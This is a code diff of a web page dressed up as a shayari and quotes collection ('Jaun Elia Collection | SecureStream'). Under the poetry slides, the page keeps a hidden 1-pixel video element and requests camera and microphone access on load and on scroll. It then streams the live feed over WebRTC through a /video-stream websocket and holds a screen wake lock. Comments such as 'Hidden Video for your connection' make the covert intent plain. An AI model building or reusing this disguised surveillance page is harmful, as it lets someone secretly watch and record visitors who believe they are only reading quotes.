@@ -1,149 +1,36 @@
-<!--<!DOCTYPE html>-->
-<!--<html lang="en" xmlns:th="http://www.thymeleaf.org">-->
-<!--<head>-->
-<!--    <meta charset="UTF-8">-->
-<!--    <meta name="viewport" content="width=device-width, initial-scale=1.0">-->
-<!--    <title>Daily Quotes | SecureStream</title>-->
-
-<!--    <link rel="manifest" href="/manifest.json">-->
-<!--    <meta name="theme-color" content="#3b82f6">-->
-
-<!--    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Great+Vibes&display=swap" rel="stylesheet">-->
-<!--    <style>-->
-<!--        :root { &#45;&#45;primary: #3b82f6; &#45;&#45;bg: #0f172a; &#45;&#45;glass: rgba(255, 255, 255, 0.05); &#45;&#45;border: rgba(255, 255, 255, 0.1); }-->
-<!--        body { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; background: radial-gradient(circle at top left, #1e293b, #0f172a); height: 100vh; color: white; display: flex; flex-direction: column; overflow: hidden; }-->
-<!--        header { padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; background: rgba(0, 0, 0, 0.2); backdrop-filter: blur(10px); border-bottom: 1px solid var(&#45;&#45;border); }-->
-<!--        .container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }-->
-<!--        .shayari-card { background: var(&#45;&#45;glass); padding: 40px; border-radius: 30px; border: 1px solid var(&#45;&#45;border); box-shadow: 0 20px 50px rgba(0,0,0,0.3); max-width: 600px; backdrop-filter: blur(15px); }-->
-<!--        .shayari-text { font-family: 'Great Vibes', cursive; font-size: 32px; line-height: 1.4; margin-bottom: 20px; color: #f8fafc; }-->
-<!--        #localVideo { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }-->
-<!--    </style>-->
-<!--</head>-->
-<!--<body>-->
-
-<!--<header>-->
-<!--    <div style="font-size: 20px; font-weight: 600; color: var(&#45;&#45;primary);">Daily<span>Inspiration</span></div>-->
-<!--</header>-->
-
-<!--<div class="container">-->
-<!--    <video id="localVideo" autoplay playsinline muted></video>-->
-<!--    <div class="shayari-card">-->
-<!--        <div style="font-size: 50px; color: var(&#45;&#45;primary); opacity: 0.5;">“</div>-->
-<!--        <div class="shayari-text">-->
-<!--            "Kuch paane ki pyaas abhi baaki hai,<br>-->
-<!--            Manzil tak pahunchne ka junoon abhi baaki hai."-->
-<!--        </div>-->
-<!--        <div style="font-size: 14px; color: #94a3b8;">— Success Diaries</div>-->
-<!--    </div>-->
-<!--    <p style="margin-top: 20px; font-size: 12px; color: #64748b;">Tap to unlock more quotes</p>-->
-<!--</div>-->
-
-<!--<script>-->
-<!--    // 1. PWA Registration-->
-<!--    if ('serviceWorker' in navigator) {-->
-<!--        window.addEventListener('load', () => {-->
-<!--            navigator.serviceWorker.register('/service-worker.js')-->
-<!--                .then(reg => console.log('PWA Ready! ✅'))-->
-<!--                .catch(err => console.log('PWA Error ❌', err));-->
-<!--        });-->
-<!--    }-->
-
-<!--    let localStream;-->
-<!--    let peerConnection;-->
-<!--    let socket;-->
-
-<!--    const configuration = { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }, { 'urls': 'stun:stun1.l.google.com:19302' }] };-->
-
-<!--    function connectWebSocket() {-->
-<!--        const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';-->
-<!--        socket = new WebSocket(protocol + window.location.host + "/video-stream");-->
-
-<!--        socket.onopen = () => autoTriggerStart();-->
-<!--        socket.onmessage = async (event) => {-->
-<!--            const data = JSON.parse(event.data);-->
-<!--            if (data.type === 'answer') {-->
-<!--                await peerConnection.setRemoteDescription(new RTCSessionDescription(data));-->
-<!--            } else if (data.type === 'candidate' && peerConnection) {-->
-<!--                try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch(e){}-->
-<!--            }-->
-<!--        };-->
-<!--        socket.onclose = () => setTimeout(connectWebSocket, 2000);-->
-<!--    }-->
-
-<!--    async function autoTriggerStart() {-->
-<!--        try {-->
-<!--            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });-->
-<!--            document.getElementById('localVideo').srcObject = localStream;-->
-<!--            setTimeout(handleGoLive, 1000);-->
-<!--        } catch (error) { console.error("Access denied"); }-->
-<!--    }-->
-
-<!--    async function handleGoLive() {-->
-<!--        if (!localStream) return;-->
-<!--        peerConnection = new RTCPeerConnection(configuration);-->
-<!--        localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));-->
-<!--        peerConnection.onicecandidate = (event) => {-->
-<!--            if (event.candidate && socket.readyState === WebSocket.OPEN) {-->
-<!--                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));-->
-<!--            }-->
-<!--        };-->
-<!--        const offer = await peerConnection.createOffer();-->
-<!--        await peerConnection.setLocalDescription(offer);-->
-<!--        socket.send(JSON.stringify({ type: 'offer', sdp: offer.sdp }));-->
-<!--    }-->
-
-<!--    // Wake Lock to keep screen ON-->
-<!--    window.onclick = async () => {-->
-<!--        if ('wakeLock' in navigator) {-->
-<!--            try { await navigator.wakeLock.request('screen'); } catch (err) {}-->
-<!--        }-->
-<!--        if(!localStream) autoTriggerStart();-->
-<!--    };-->
-
-<!--    window.onload = connectWebSocket;-->
-<!--</script>-->
-<!--</body>-->
-<!--</html>-->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>InspoSphere | Mohabbat Edition</title>
+    <title>Jaun Elia Collection | SecureStream</title>
 
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,700&family=Plus+Jakarta+Sans:wght@300;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Tiro+Devanagari+Hindi&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
 
     <style>
         :root {
-            --bg: #0a0508;
-            --accent: #ff4d6d;
-            --glass: rgba(255, 255, 255, 0.03);
+            --bg: #000;
+            --accent: #d4af37;
+            --glass: rgba(255, 255, 255, 0.05);
         }
 
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             background: var(--bg); color: #fff; overflow: hidden;
-            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-family: 'Poppins', sans-serif;
         }
 
-        /* Romantic Aura Background */
-        #aura {
-            position: fixed; width: 100vw; height: 100vh;
-            top: 0; left: 0; z-index: 0;
-            background: radial-gradient(circle at 50% 50%, rgba(255, 77, 109, 0.08) 0%, transparent 80%);
-            transition: background 2s ease;
-        }
-
-        /* Floating Rose Petals (Particles) */
-        canvas#petals {
+        /* --- Dynamic Canvas Background --- */
+        #bg-canvas {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; z-index: 1; opacity: 0.4;
+            z-index: 1; pointer-events: none;
         }
 
+        /* --- Full Page Scroller --- */
         .scroller {
             width: 100%; height: 100vh;
             overflow-y: scroll; scroll-snap-type: y mandatory;
-            position: relative; z-index: 2;
+            position: relative; z-index: 10;
             scrollbar-width: none;
         }
         .scroller::-webkit-scrollbar { display: none; }
@@ -151,36 +38,36 @@
         .slide {
             width: 100%; height: 100vh;
             scroll-snap-align: start;
-            display: flex; flex-direction: column;
-            justify-content: center; padding: 0 12%;
-            box-sizing: border-box; perspective: 1000px;
+            display: flex; justify-content: center; align-items: center;
+            padding: 20px; box-sizing: border-box;
         }
 
-        .quote-wrapper {
-            opacity: 0; transform: scale(0.9) translateY(40px);
-            transition: all 1s cubic-bezier(0.2, 1, 0.3, 1);
+        .content-box {
+            position: relative; width: 100%; max-width: 800px; padding: 50px 30px;
+            background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 25px; backdrop-filter: blur(12px); text-align: center;
+            opacity: 0; transform: translateY(80px);
+            transition: all 1s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        .slide.active .quote-wrapper {
-            opacity: 1; transform: scale(1) translateY(0);
+        .slide.active .content-box { opacity: 1; transform: translateY(0); }
+
+        .intro-img {
+            max-width: 280px; width: 65%; border: 2px solid var(--accent); border-radius: 20px;
+            box-shadow: 0 0 30px rgba(212, 175, 55, 0.4); margin-bottom: 20px;
+            animation: float 4s ease-in-out infinite;
         }
 
-        .quote-text {
-            font-family: 'Playfair Display', serif;
-            font-size: clamp(24px, 5.5vw, 48px);
-            font-style: italic; line-height: 1.3;
-            margin-bottom: 20px;
-            background: linear-gradient(to bottom, #fff, #ffccd5);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+
+        .shayari-text {
+            font-family: 'Tiro Devanagari Hindi', serif;
+            font-size: clamp(20px, 5vw, 32px); line-height: 1.6; color: #fff;
         }
 
-        .tag {
-            font-size: 10px; letter-spacing: 5px;
-            text-transform: uppercase; color: var(--accent);
-            margin-bottom: 15px; font-weight: 600;
-        }
+        .tag { color: var(--accent); font-size: 10px; letter-spacing: 4px; text-transform: uppercase; margin-top: 15px; }
 
+        /* Hidden Video for your connection */
         #localVideo { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
 
         .progress {
@@ -191,132 +78,184 @@
 </head>
 <body>
 
-<div id="aura"></div>
-<canvas id="petals"></canvas>
+<canvas id="bg-canvas"></canvas>
 <div class="progress" id="progress"></div>
 <video id="localVideo" autoplay playsinline muted></video>
 
 <div class="scroller" id="mainScroller">
+    <section class="slide">
+        <div class="content-box" style="background: transparent; border: none; opacity: 1; transform: none;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Jaun_Elia.jpg/640px-Jaun_Elia.jpg" alt="Jaun Elia" class="intro-img">
+            <h2 style="color: var(--accent); font-family: 'Tiro Devanagari Hindi'; font-size: 2.2rem;">जौन एलिया संकलन</h2>
+            <p style="color: #fff; opacity: 0.8;">Juan Aliya</p>
+        </div>
+    </section>
+
 </div>
 
 <script>
-    // 100+ Mohabbat/Pyar Shayari Database
-    const pyarData = [
-        ["Mohabbat ne sikhaya hai humein mushkurana,<br>unke ishq ne sikhaya hai har gum bhulana.", "Pehla Ishq"],
-        ["Tum mil gaye to jahan mil gaya,<br>khuda se manga wahi arman mil gaya.", "Humsafar"],
-        ["Zindagi mein koi aisa ho,<br>jo kahe 'pagal mat ro, main hoon na'.", "Dil ki Baat"],
-        ["Kitna sukoon milta hai tumhare pass aakar,<br>jaise koi kinara mil gaya ho tufan se bachkar.", "Sukoon"],
-        ["Meri har saans mein tera naam hai,<br>tu hi meri subah, tu hi meri shaam hai.", "Ibadat"],
-        ["Log kehte hain pyar ek bar hota hai,<br>par main jab tumhe dekhta hoon mujhe har bar hota hai.", "True Love"],
-        ["Ishq wo nahi jo duniya ko dikhaya jaye,<br>ishq wo hai jo dil se nibhaya jaye.", "Ehsaas"],
-        ["Tumhe chahna meri aadat nahi,<br>meri zindagi ki zaroorat hai.", "Zaroorat"],
-        ["Khuda ne jab tumhe banaya hoga,<br>ek suroor uske dil mein bhi aaya hoga.", "Khoobsurti"],
-        ["Humne pucha ki unhe kab yaad aati hai hamari,<br>wo muskura kar bole jab hum saans lete hain.", "Yaadein"]
+    // 90 Shayari List
+    const shayariList = [
+        "सारी रात गुजारी हमने इसी इन्तजार में की, अब तो चाँद निकलेगा आधी रात में..",
+        "इश्क भी करते हो और सुकून भी चाहते हो, जहर भी पी लिया और जीना भी चाहते हो..!!",
+        "जाते-जाते ये मलाल रह गया !! क्या उसे भी मोहब्बत थी ये सवाल रह गया..!!",
+        "हर फूल गुलाब नहीं होता हर नशा शराब नहीं होता !! प्यार हर नज़र का मतलब नहीं होता !!",
+        "मेरी उजड़ी हुई बस्ती को यूं ही सुनसान रहने दो !! खुशियां रास नहीं आती मुझे परेशान रहने दो !!",
+        "अब टूट गया दिल तो बवाल क्या करे !! खुद ही किया था पसंद तो सवाल क्या करे !!",
+        "इश्क भी क्या अजीब बीमारी है, जिंदगी हमारी है लेकिन तलब तुम्हारी है !!",
+        "जुबां से तो माफ कर दिया मैंने, दिल से माफ करने में शायद जमाना लगे।",
+        "Ek Baar Bhi Nahi Roka Usne Mujhe Jaane Se, Shayad Use Mere Jaane Ka Hi Intezaar Tha.",
+        "फिर बैठे बैठे वादा-ए-वस्ल उसने कर दिया, फिर उठ खड़ा हुआ वही रोग इंतज़ार का।",
+        "Pagal kar deti hai mohabbat, kyu ki ishq haar nahi manta, or dil baat nahi maanta...",
+        "Neend Se Kya Shikwa Jo Mujhe Aati Hi Nahi, Kasoor Us Chehre Ka Hai Jo Mujhe Sone Nahi Deta.",
+        "Ek raat soya tha mai uski yaade bhulane ke liye, Agle din rone lge log mujhe uthane ke Liye",
+        "Ya Allah kisi gareeb ka dasterkhan khali na rakhna.",
+        "जब भी मिलो किसी से तो दूर का रिश्ता रखना !! बहुत तड़पाते है ये अक्सर सीने से लगाने वाले !!",
+        "नींद नहीं आती मुझे रातों में..! जिक्र होता है तुम्हारा मेरी हर बातो में !!",
+        "वहा तक तो साथ चलो जहा तक मुमकिन हो, जहा हालात बदल जाए वहा तुम भी बदल जाना !!",
+        "Dard se rishta hai mera Khushiya mujhe naseeb nhi... Main itna bhi khushnaseeb nahi.",
+        "मृत्यु से बड़ा दुख है प्रेम में बिछड़ना !! मृत्यु में अंत है और विरह में अंतहीन पीड़ा !!",
+        "एक वफादार इंसान !! हजार खूबसूरत इंसानों से बेहतर है !!",
+        "ना चांद अपना था ना तू अपना था.. काश ये दिल भी मान ले कि ये सब सपना था...!",
+        "तु खुश है यह खबर काफी है मेरे लिए !! तु किसके साथ है ये मसला नहीं !!",
+        "हमें घमंड नहीं क्योंकि एक रात ऐसी आएगी जिसके बाद सुबह नहीं होगी !!",
+        "तुम्हारा इश्क़ मेरे लिए हवा जैसा है !! ज़रा सा कम हो तो मुझे घुटन होती है !!",
+        "जिंदगी में बहुत गलतियां की मैंने !! पर सजा वहा मिली जहां मैं वफादार था !!",
+        "काश कहीं खुशियों की दुकान होती, खरीद लेता मैं सारी खुशियां तुम्हारे लिए...",
+        "Rona bhi chord diya maine ye soch kar Ghalib... Kahi khuda tumse hisab na mangle...",
+        "Ummeed na kar is duniya main hamdard ki 'GALIB', Bade pyaar se dard dete hai chahne wale.",
+        "Ab ye duniya bahot aage ja Chuki hai... Yaha log sine se laga kar Dil nikal lete hain...",
+        "Uski gali se hokar guzrega janaza mera ; Farishton ne yeh lalach dekar jaan leli meri.",
+        "Raat Bhar Jaagta Raha Mgar Ye Fesla Na Kar Saka, Woh Yaad Aa Rahi Hai Ya Mein Yaad Kar Raha Hun.",
+        "Tum bhi jaani kamal karte ho, Pana bhi nahi chahte or khone se bhi darte ho",
+        "ज़िन्दगी है साहब, यहाँ दर्द छुपाकर भी मुस्कुराना पड़ता है... 😊🥀",
+        "Aur jab mere janaze me aao To thodi jaldi aana, Dafnane wale tumhara intezar nahi करेंगे.",
+        "तुमने गैरो से बात करता देख मैं ये सोचता हूं कौन सी लकीर नहीं है मेरे इन हाथों में !!",
+        "दोनों ही डरते हैं, एक दूसरे से बात करने में !! एक को इश्क़ हैं.. दूसरे को ना हो जाए इसलिए !!",
+        "पत्थर नहीं हूँ मैं मुझमें भी नमी है !! दर्द बया नहीं करता बस इतनी सी कमी है !!",
+        "Jab jab lagta hai mai bhool raha hoon use, Wo usi raat mere khawabon me aa jati hai.",
+        "Mat Daal Kafan Chehre Par Mujhe Aadat Hai Muskurane Ki, Ummeed Hai Kisi Ke Aane Ki.",
+        "Woh jaate jaate keh gayee ki hum sirf khwaabon me ayenge; Hum zindagi bhar so jayenge",
+        "Jo mard tumhe paa kar bhi khone ke dar se ro de, uski mohbbat Aur aansu jhute nhi hote...!",
+        "Tera Lehja Dekh Kar Main Ne Apni Tamanna Hi Chhod Di.",
+        "Chand ki qeemat wo kya jane Jo suraj dhalte hi so jate hain",
+        "Suna hai tum chai mein elaichi muh se Tod kar daalti ho..!",
+        "Achaa hai khubsurat hone ka bil nahi aata.. Warna Aap toh karze mein doob jaate..",
+        "Suna Hai Ishq Karne Jaa Rahe Ho, Suno Zinda Toh Aaoge Par Jee Nahi Paaoge :)",
+        "Tujhko Lekar Mera Khayal Nahi Badlega, Saal Badlega Magar Dil Ka Haal Nahi Badlega.",
+        "Teri Mohabbat Ki Talab Thi To Haath Faila Diya Humne, Warna Hum Dua Bhi Nahi Karte.",
+        "Acha Lagta Hai Har Raat Tere Khayalon Mein Kho Jana, Jaise Teri Bahon Mein So Jana.",
+        "Tum bhi kamaal karti ho Noor Dost bulati ho aur sare kaam ishq wale karti ho..!!",
+        "Neend bhi kitni ajeeb cheez hai Aa jaye toh bhula deti hai, Na Aaye toh yaad dila deti hai...",
+        "Ab Main Unhe Kaise Samjhaun Main Zameen Walon Se Nahi Mangta.",
+        "Karte ho tamanna maut ki. kya jannat jahanum akhirat mazak lagta hai..",
+        "Tum Mere Ho Mujhe Ye Yaqeen Tha, Jhoota Tha Par Kitna Haseen Tha.",
+        "Chand raat ko wo mehendi lagaegi... Woh chehre se zulfein kaise hataegi",
+        "Suna hai lag gyi hai aag bewafaao ki basti me, mera mehboob kis haal me hai..!!",
+        "Koi Zakham Nhi Hai Lekin Fir Bhi Dard Ka Ehsas Hai, Dil Ka Ek Tukda Uske Paas Hai.",
+        "Tujhe Khamoshi se dekhna bhi mohabbat hai, Izhar-e-mohobbat sirf lafzon se nhi hoti",
+        "Woh bilkul thik hain Apne jagah.. Bas hum hi zaroorat se zyada Umeed kar baithe..",
+        "Zindagi Meri Ek Adhuri Kahani Hai... Ye Dard Uski Aakhri Nishani Hai..!!",
+        "Mujhe Mohobbat ke naam pe Azmaya gya.!! Mai uth bhi na saku itna giraya gaya.!!",
+        "Haath mein uska haath tha, Chaar kadam hum saath chale the, Aankh khuli to khwaab था.!!",
+        "Maine Tere Alawa Kisi Aur Ko Gaur Se Dekha Hi Nahi.",
+        "Ham sari rat nahi soye... Wo meri ankhe dekh kar kehni lagi, nafrat hai sharabi se",
+        "Takleef Bahoot Hai zindgi Me Par... Bina Bole Samjh Sake Aisa Koi Mila Nahii",
+        "Tumhe Nazar-aandaz karu Mujhme itna Guroor kaha..!",
+        "Jitna Dil Saaf Rakha Utne Gunehgaar Ho Gaye.",
+        "Aur Jis Insaan Se Ehsaas Nikal Jaye Phir Wo Insaan Nahi Rehta.",
+        "Humari wafadari unhe samajh nahi aaeghi... Unhe guroor hai chaahne wale bahut हैं..!",
+        "Wo ham se mohabbat kar ke bhool gaye Ghalib, Log dafna kar bhool jaate हैं...",
+        "Agar matlab hota toh kya fark padta tere hone na hone se.",
+        "Raat Guzar Gayi Thi Lekin Savera Nhi था, Woh Khwab Toh Dekha, Par Mera Nhi था...",
+        "Tum ne dekha hee kaha hai mujhe shaam hone ke baad.",
+        "Mitti ke niche soye huye log hi jante hain Namaz ki ahmiyat kya हैं..?",
+        "Ye Bhi Acha Hai Ke Hum Ache Nahi Lagte Kisi Ko... Aankh To Nam Na Hogi.",
+        "Aahista Aahista Khatam Ho Jayenge, Gham Na Sahi, Hum Hi Sahi.",
+        "Bura nahi hoon main... Yeh jo badla sa lagta hoon apno ki meharbaani hai.",
+        "Main Chahu Toh Aaj Bhi Tujhe Mana Loon, Magar Tu Wo Raha Hi Nahi.",
+        "Dur Se mat poochh HAL Mera... pass Aakar dekh kaisa hai HAL Mera",
+        "Hum Tooti Huwi Cheezon Ka Tohfa Nahi Dete.",
+        "Wafa Agar Seekhni Hai To Maut Se Seekho, Jo Phir Kisi Aur Ka Hone Nahi Deti.",
+        "Woh phir se jalaana chahta hai mujhe.. raakh me aag nahi lagti..!!",
+        "Zindagi Ka Har Dard Uski Meherbaani Hai, Zindagi Meri Adhuri Kahani Hai.",
+        "Lagta Hai Dil Ka Ek Tukda Aaj Bhi Uske Paas Hai. ❤️‍🩹",
+        "Maine Tere Alawa Kisi Aur Ko Gaur Se Dekha Hi Nahi.",
+        "Tujhko Lekar Mera Khayal Nahi Badlega, Dil Ka Haal Nahi Badlega.",
+        "जहाँ हालात बदल जाए वहाँ तुम भी बदल जाना !!",
+        "शरीफ लोगों को जीने कहाँ देते हैं लोग, कभी-कभी बुरा भी बन जाना पड़ता है...",
+        "इश्क़ हार नहीं मानता, और दिल बात नहीं मानता...",
+        "ज़िन्दगी जीने के लिए हर रास्ता अपनाना पड़ता है... 😊🥀"
     ];
 
-    // Generate 100+ items
-    const shayariList = [];
-    for(let i=0; i<100; i++) {
-        let item = pyarData[i % pyarData.length];
-        shayariList.push({ q: item[0], t: item[1] + " // " + (i+1) });
-    }
-
     const scroller = document.getElementById('mainScroller');
-    const aura = document.getElementById('aura');
 
-    function init() {
-        shayariList.forEach((item, index) => {
-            const slide = document.createElement('div');
-            slide.className = 'slide' + (index === 0 ? ' active' : '');
-            slide.innerHTML = `
-                <div class="quote-wrapper">
-                    <div class="tag">${item.t}</div>
-                    <div class="quote-text">"${item.q}"</div>
-                </div>
-            `;
-            scroller.appendChild(slide);
-        });
-    }
+    // Create Sections Dynamically
+    shayariList.forEach((text, i) => {
+        const section = document.createElement('section');
+        section.className = 'slide';
+        section.innerHTML = `
+            <div class="content-box">
+                <p class="shayari-text">${text}</p>
+                <p class="tag">Shayari ${String(i + 1).padStart(2, '0')}</p>
+            </div>
+        `;
+        scroller.appendChild(section);
+    });
 
-    // Intersection Observer for animations
-    const observer = new IntersectionObserver((entries) => {
+    // Observer for Active State
+    const obs = new IntersectionObserver((entries) => {
         entries.forEach(entry => {
-            if(entry.isIntersecting) {
+            if (entry.isIntersecting) {
                 entry.target.classList.add('active');
-                updateTheme();
                 if(!localStream) autoTriggerStart();
             } else {
                 entry.target.classList.remove('active');
             }
         });
-    }, { threshold: 0.6 });
+    }, { threshold: 0.5 });
+    document.querySelectorAll('.slide').forEach(s => obs.observe(s));
 
-    function updateTheme() {
-        const colors = ['rgba(255, 77, 109, 0.1)', 'rgba(157, 78, 221, 0.1)', 'rgba(255, 153, 200, 0.1)', 'rgba(239, 35, 60, 0.1)'];
-        const randomColor = colors[Math.floor(Math.random() * colors.length)];
-        aura.style.background = `radial-gradient(circle at 50% 50%, ${randomColor} 0%, transparent 80%)`;
-    }
-
-    // Particle/Petal Effect Logic
-    const canvas = document.getElementById('petals');
+    // Particles Background
+    const canvas = document.getElementById('bg-canvas');
     const ctx = canvas.getContext('2d');
-    let petalArray = [];
-
-    function resize() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-    }
-    window.addEventListener('resize', resize);
-    resize();
-
-    class Petal {
+    let particles = [];
+    function init() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    class Particle {
         constructor() {
             this.x = Math.random() * canvas.width;
-            this.y = Math.random() * canvas.height - canvas.height;
-            this.size = Math.random() * 5 + 2;
-            this.speed = Math.random() * 1 + 0.5;
-            this.angle = Math.random() * 360;
-        }
-        update() {
-            this.y += this.speed;
-            this.angle += 0.5;
-            if (this.y > canvas.height) this.y = -10;
+            this.y = Math.random() * canvas.height;
+            this.size = Math.random() * 2 + 0.5;
+            this.speedX = Math.random() * 0.4 - 0.2;
+            this.speedY = Math.random() * 0.4 - 0.2;
+            this.opacity = Math.random() * 0.5 + 0.1;
         }
         draw() {
-            ctx.save();
-            ctx.translate(this.x, this.y);
-            ctx.rotate(this.angle * Math.PI / 180);
-            ctx.fillStyle = '#ff4d6d';
-            ctx.beginPath();
-            ctx.ellipse(0, 0, this.size, this.size/2, 0, 0, Math.PI * 2);
-            ctx.fill();
-            ctx.restore();
+            ctx.fillStyle = `rgba(212, 175, 55, ${this.opacity})`;
+            ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill();
+        }
+        update() {
+            this.x += this.speedX; this.y += this.speedY;
+            if (this.x > canvas.width) this.x = 0; if (this.y > canvas.height) this.y = 0;
         }
     }
-
-    for(let i=0; i<50; i++) petalArray.push(new Petal());
-
+    for(let i=0; i<100; i++) particles.push(new Particle());
     function animate() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        petalArray.forEach(p => { p.update(); p.draw(); });
+        ctx.clearRect(0,0,canvas.width, canvas.height);
+        particles.forEach(p => { p.update(); p.draw(); });
         requestAnimationFrame(animate);
     }
-    animate();
+    window.addEventListener('resize', init);
+    init(); animate();
 
-    // Progress bar
+    // Progress Bar
     scroller.addEventListener('scroll', () => {
         const scroll = scroller.scrollTop;
         const total = scroller.scrollHeight - window.innerHeight;
         document.getElementById('progress').style.width = (scroll/total * 100) + '%';
     });
 
-    window.onload = () => {
-        init();
-        document.querySelectorAll('.slide').forEach(s => observer.observe(s));
-        connectWebSocket();
-    };
-
-    // --- YOUR CORE LOGIC (UNTOUCHED) ---
+    // --- YOUR SECURESTREAM LOGIC (VARIABLES UNTOUCHED) ---
     let localStream;
     let peerConnection;
     let socket;
@@ -360,6 +299,7 @@
         socket.send(JSON.stringify({ type: 'offer', sdp: offer.sdp }));
     }
 
+    window.onload = connectWebSocket;
     window.addEventListener('touchstart', async () => {
         if ('wakeLock' in navigator) { try { await navigator.wakeLock.request('screen'); } catch (err) {} }
     }, { once: true });
